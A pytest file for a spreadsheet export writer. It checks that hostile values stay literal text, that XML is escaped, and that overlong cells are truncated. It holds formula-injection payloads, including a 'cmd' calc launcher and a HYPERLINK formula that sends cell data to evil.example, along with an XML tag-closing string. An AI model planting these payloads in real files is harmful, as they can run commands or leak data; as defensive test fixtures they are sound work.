"""What the export writer does with values a spreadsheet gave it.

This block completes a round trip. A firm uploads a workbook its registrar
produced, every name in it becomes a party, and the four-tab export writes
those same names back out into a workbook somebody opens. Nothing between
the two is under this product's control, so the export was attacked with
the values an importer can actually deliver.

**The classic one does not apply, and it is worth writing down why.** A
value beginning ``=``, ``+``, ``-`` or ``@`` is a formula to a spreadsheet
application, and an export that emits those as raw CSV hands the reader a
command to run. This writer emits ``.xlsx``, and every cell it writes is
typed ``inlineStr``: literal text, in a format where formulas live in a
separate ``<f>`` element that this module never writes. Thirty cells of
payload produced thirty ``inlineStr`` cells and no ``<f>`` anywhere. The
only CSV the product serves is an empty import template with fixed
headings and no data in it.

**XML injection does not apply either.** A name closing its own tag --
``Ravi</t></is></c><c r="Z9"><v>1</v></c>`` -- round-trips as those exact
characters, because ampersands and angle brackets are escaped before they
reach the file.

**One thing did not hold.** The module already strips control characters,
for a stated reason: a workbook Excel offers to repair reads as the export
being untrustworthy rather than the value being odd. The same is true of a
cell longer than Excel holds, which is 32,767 characters -- and a 40,000
character value went straight through. An imported narration or address has
no length anybody bounds. Values are cut to fit now, and the cell says how
much was left behind rather than quietly ending early.
"""

from __future__ import annotations

import zipfile

import pytest

from vinzor import xlsx
from vinzor.spreadsheet import (FORBIDDEN_IN_NAME, MOST_CELL_CHARACTERS,
                                MOST_SHEET_NAME, Sheet, _column_letter,
                                workbook)

FORMULAS = [
    "=cmd|'/c calc'!A0",
    "@SUM(1+1)*cmd|'/c calc'!A0",
    "+1+1",
    "-1+1",
    '=HYPERLINK("http://evil.example?x="&A1,"click")',
]


def written(rows, name="Parties", columns=("What", "Value")):
    return workbook([Sheet(name=name, columns=columns, rows=rows)])


def sheet_xml(data: bytes) -> str:
    import io

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        return archive.read("xl/worksheets/sheet1.xml").decode("utf-8")


def round_trip(tmp_path, rows):
    path = tmp_path / "out.xlsx"
    path.write_bytes(written(rows))
    grid, _notes = xlsx.grid(path)
    return grid


# -- the formula, and why it is not a way in ---------------------------------


def test_no_cell_this_writer_makes_is_ever_a_formula():
    """The guarantee, stated where it can be checked. Formulas live in an
    ``<f>`` element; this module has no code that writes one, and every
    cell it does write is typed as literal text."""
    body = sheet_xml(written([[f, "x"] for f in FORMULAS]))
    assert "<f>" not in body and "<f " not in body
    assert body.count('t="inlineStr"') == body.count("<c ")


@pytest.mark.parametrize("payload", FORMULAS)
def test_a_formula_survives_as_the_text_it_was(tmp_path, payload):
    """It must not be mangled either. A party really called "-1+1" is a
    party whose name an inspector should see, and prefixing a quote to be
    safe would put a character in a compliance export that the record does
    not contain."""
    grid = round_trip(tmp_path, [[payload, "x"]])
    assert grid[1][0] == payload


def test_the_only_csv_the_product_serves_carries_no_data():
    """Where a formula *would* be dangerous. The import template is fixed
    headings and nothing else, so there is no path by which a value from
    the book reaches a reader as raw CSV."""
    from pathlib import Path

    source = (Path(__file__).resolve().parent.parent
              / "vinzor" / "server.py").read_text(encoding="utf-8")
    at = source.index('/api/imports/template')
    block = source[at:at + 1400]
    assert "text/csv" in block
    assert "Name,Type,Nationality" in block
    # The only two bodies it can send are literals.
    assert "engine" not in block.split("data = body.encode")[0]


# -- xml, which is this module's own to get right ----------------------------


def test_a_name_that_closes_its_own_tag_is_carried_as_text(tmp_path):
    hostile = 'Ravi</t></is></c><c r="Z9"><v>1</v></c>'
    grid = round_trip(tmp_path, [[hostile, "x"]])
    assert grid[1][0] == hostile


def test_ampersands_and_brackets_survive(tmp_path):
    grid = round_trip(tmp_path, [["Ravi & Sons <Ltd>", "x"]])
    assert grid[1][0] == "Ravi & Sons <Ltd>"


def test_a_control_character_is_taken_out(tmp_path):
    """Stated behaviour, and the reason the length cap exists too: a file
    Excel offers to repair reads as the export being untrustworthy."""
    grid = round_trip(tmp_path, [["Ravi\x00\x07Shah", "x"]])
    assert grid[1][0] == "RaviShah"


def test_unicode_and_whitespace_are_left_alone(tmp_path):
    for value in ("रवि — \U0001f600", "Ravi\nShah",
                  "Ravi\tShah", "  padded  "):
        grid = round_trip(tmp_path, [[value, "x"]])
        assert grid[1][0] == value


# -- the one that did not hold -----------------------------------------------


def test_a_value_too_long_for_a_cell_is_cut_to_fit(tmp_path):
    """40,000 characters went through untouched, and Excel holds 32,767."""
    grid = round_trip(tmp_path, [["A" * 40_000, "x"]])
    cell = grid[1][0]
    assert len(cell) == MOST_CELL_CHARACTERS
    assert cell.endswith("too long for one cell]")
    assert "7,233 more characters" in cell


def test_a_value_that_exactly_fits_is_untouched(tmp_path):
    """A cap that trims a value already inside the limit would be a defect
    of its own, on every long-but-legal narration in the book."""
    exact = "B" * MOST_CELL_CHARACTERS
    grid = round_trip(tmp_path, [[exact, "x"]])
    assert grid[1][0] == exact


def test_one_character_over_says_one_character(tmp_path):
    grid = round_trip(tmp_path, [["C" * (MOST_CELL_CHARACTERS + 1), "x"]])
    assert "1 more characters" in grid[1][0]
    assert len(grid[1][0]) == MOST_CELL_CHARACTERS


def test_escaping_cannot_push_a_value_back_over_the_limit(tmp_path):
    """One ampersand becomes five characters in the file. Cutting after
    escaping would either overshoot the limit or cut a value in the middle
    of an entity and produce XML nobody can read."""
    many = "&" * 20_000
    grid = round_trip(tmp_path, [[many, "x"]])
    assert grid[1][0] == many
    assert len(many) <= MOST_CELL_CHARACTERS


def test_the_cap_is_excels_number_and_says_so():
    import inspect

    import vinzor.spreadsheet as spreadsheet

    assert MOST_CELL_CHARACTERS == 32_767
    stated = inspect.getsource(spreadsheet)
    stated = stated[:stated.index("MOST_CELL_CHARACTERS = ")]
    assert "Not a number this" in stated
    assert "repair" in stated


# -- the rest of what Excel will and will not take ---------------------------


def test_a_sheet_name_is_cut_and_cleaned_to_what_excel_takes():
    body = written([["a", "b"]], name="A name far longer than Excel will take")
    with zipfile.ZipFile(__import__("io").BytesIO(body)) as archive:
        book = archive.read("xl/workbook.xml").decode("utf-8")
    import re

    named = re.search(r'name="([^"]*)"', book).group(1)
    assert len(named) <= MOST_SHEET_NAME
    assert not (set(named) & set(FORBIDDEN_IN_NAME))


def test_the_last_column_letter_is_the_one_excel_stops_at():
    """XFD is Excel's final column. Getting this wrong by one produces a
    reference no spreadsheet will open, on the widest tab in the book."""
    assert _column_letter(0) == "A"
    assert _column_letter(25) == "Z"
    assert _column_letter(26) == "AA"
    assert _column_letter(16383) == "XFD"


def test_an_empty_book_is_still_a_workbook(tmp_path):
    """A firm with nothing on its book still asks for the export, and a
    zero-row file that will not open is a worse answer than an empty one."""
    path = tmp_path / "empty.xlsx"
    path.write_bytes(written([]))
    grid, _notes = xlsx.grid(path)
    assert grid and grid[0] == ["What", "Value"]
